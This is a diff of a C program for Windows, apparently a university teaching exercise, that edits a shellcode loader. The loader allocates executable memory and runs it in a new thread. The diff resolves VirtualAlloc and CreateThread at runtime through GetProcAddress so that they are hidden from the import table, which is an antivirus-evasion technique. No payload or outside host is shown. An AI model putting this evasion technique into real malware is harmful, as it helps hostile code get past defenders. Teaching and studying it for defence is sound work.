@@ -1,4 +1,4 @@
-//EDU for Entropy and strings
+//EDU for hiding imports
 
 #include <Windows.h>
 #include <stdio.h>
@@ -6,6 +6,7 @@
 //------------------------------------------------------------------------------------------//
 // DO NOT TOUCH THIS STUFF BELOW HERE
 typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef LPVOID(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwFlags, LPDWORD lpThreadId);
 const char* test_string = "UniOffenburg2025";
 void test_func() {
 	OutputDebugStringA(test_string);
@@ -87,12 +88,10 @@ int main() {
 	HANDLE hKern = GetModuleHandleA("kernel32.dll");
 	PVOID pVirtualAlloc = GetProcAddress(hKern, "VirtualAlloc");
 	fnVirtualAlloc pVirtualAllocFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
-	hVirtualAlloc = pVirtualAllocFunc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
 	// press enter to continue
 	printf("Press Enter to allocate and execute shellcode...\n");
 	getchar();
-	hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	hVirtualAlloc = pVirtualAllocFunc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (hVirtualAlloc == NULL) {
 		printf("[-] VirtualAlloc failed. Error: %lu\n", GetLastError());
 		return 1;
@@ -115,7 +114,9 @@ int main() {
 	// Create a thread to execute the shellcode
 	printf("Press Enter to create a new thread...\n");
 	getchar();
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
+	PVOID pCreateThread = GetProcAddress(hKern, "CreateThread");
+	fnCreateThread pCreateThreadFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
+	HANDLE hThread = pCreateThreadFunc(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
 	if (hThread == NULL) {
 		printf("[-] CreateThread failed. Error: %lu\n", GetLastError());
 		return 1;
@@ -123,8 +124,6 @@ int main() {
 	else {
 		printf("[+] CreateThread succeeded. Thread Handle: %p\n", hThread);
 	}
-
-
 	WaitForSingleObject(hThread, INFINITE);
 
 	return 0;
